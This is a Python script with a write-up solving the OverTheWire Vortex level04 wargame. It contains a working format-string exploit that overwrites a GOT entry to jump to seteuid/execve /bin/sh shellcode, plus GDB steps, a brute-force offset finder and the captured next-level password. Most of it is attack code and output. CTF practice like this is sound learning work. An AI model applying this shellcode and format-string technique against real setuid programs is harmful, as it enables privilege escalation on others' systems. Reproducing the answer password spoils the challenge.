"""
Over the Wire / Pull the Plug Vortex level04

I had issues debugging with Radare2, it was getting PTRACE issues
I had issues debugging with GDB until I compiled the wrapper as 32-bit, `gcc -o w -m32 wrapper04.c`

# Debugging with GDB
```
cd /tmp/berne
gdb -q ./w
set disassembly intel
catch exec
set args $(python -c 'print "\x16\xa0\x04\x08\x14\xa0\x04\x08%65527x%102$hp%57293x%103$hpj1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bRhn/shh//bi\x89\xe3\x89\xd1\xcd\x80BBBB"')
set args $(python -c 'print "\x16\xa0\x04\x08\x14\xa0\x04\x08%65527x%102$hn%57293x%103$hnj1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bRhn/shh//bi\x89\xe3\x89\xd1\xcd\x80BBBB"')
r
b main
watch *0x0804a014
b *0x08048473
c
c
x/s $eax+36
x/dwx 0x0804a014
```

# Exploiting
```
./w $(python -c 'print "\x16\xa0\x04\x08\x14\xa0\x04\x08%65527x%102$hn%57293x%103$hnj1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bRhn/shh//bi\x89\xe3\x89\xd1\xcd\x80BBBB"')
cat /etc/vortex_pass/vortex5
:4VtbC4lr
```
"""

import struct
import subprocess

# seteuid execve /bin/sh
SHELLCODE = SC = 'j1X\x99\xcd\x80\x89\xc3\x89\xc1jFX\xcd\x80\xb0\x0bRhn/shh//bi\x89\xe3\x89\xd1\xcd\x80'
plt_exit = 0x0804a014
wa = plt_exit
# from GDB I saw what x/s $eax+36 where the shellcode is
sc_addr = 0xffffdfcc
# 8 bytes written thus far (2x DWORD pointers for wa_hi and wa_lo)
ctr_hi = (0xffff - 8)
# chars written thus far will equal ctr_hi
# we will print a %x so take another 8 chars off
ctr_lo = (0xdfcc - ctr_hi - 8) 


def generate_exploit_string(wa, ctr_hi, ctr_lo, off_hi, off_lo, sc=SC, pad=0, pada='A', padb='B', rw='r'):
    if rw == 'w' or rw == 'n':
        # write short
        rw = 'hn'
    else:
        # read pointer (short is ignore but keeps fmt string length constant)
        rw = 'hp'
    # Little Endian, least significant bytes written first
    wa_lo = struct.pack("<L", wa)
    wa_hi = struct.pack("<L", wa+2)
    f = (
        "{pa}"
        "{wa_hi}"
        "{wa_lo}"
        "%{ctr_hi:05d}x"
        "%{off_hi:03d}${rw}"
        "%{ctr_lo:05d}x"
        "%{off_lo:03d}${rw}"
        "{sc}"
        "{pb}".format(
            pa=pada*pad,
            wa_hi=wa_hi,
            wa_lo=wa_lo,
            ctr_hi=(ctr_hi & 0xffff),
            ctr_lo=(ctr_lo & 0xffff),
            off_hi=off_hi,
            off_lo=off_lo,
            sc=sc,
            pb=padb*(4-pad),
            rw=rw
        )
    )
    return f


def brute_exploit_string(wa, ctr_lo, ctr_hi, off_range=100, sc=SC):
    l = []
    for pad in range(5):
        for off_hi in range(1,off_range):
            off_lo = off_hi + 1
            i = generate_exploit_string(wa, ctr_hi, ctr_lo, off_hi, off_lo, sc=sc, pad=pad)
            o = subprocess.check_output(['./w', i])
            l.append((off_lo, pad, i,o))
    return l


def filter_exploit(wa, o):
    wa_hi = "{wa:x}".format(wa=wa)
    wa_lo = "{wa:x}".format(wa=wa+2)
    return wa_hi in o and wa_lo in o


l = brute_exploit_string(plt_exit, ctr_lo, ctr_hi, off_range=110)
winrars = set([e for e in l if filter_exploit(wa, e[3])])
if len(winrars) > 0:
    off_los = set([off_lo for off_lo, pad, i, o in winrars])
    pads = set([pad for off_lo, pad, i, o in winrars])
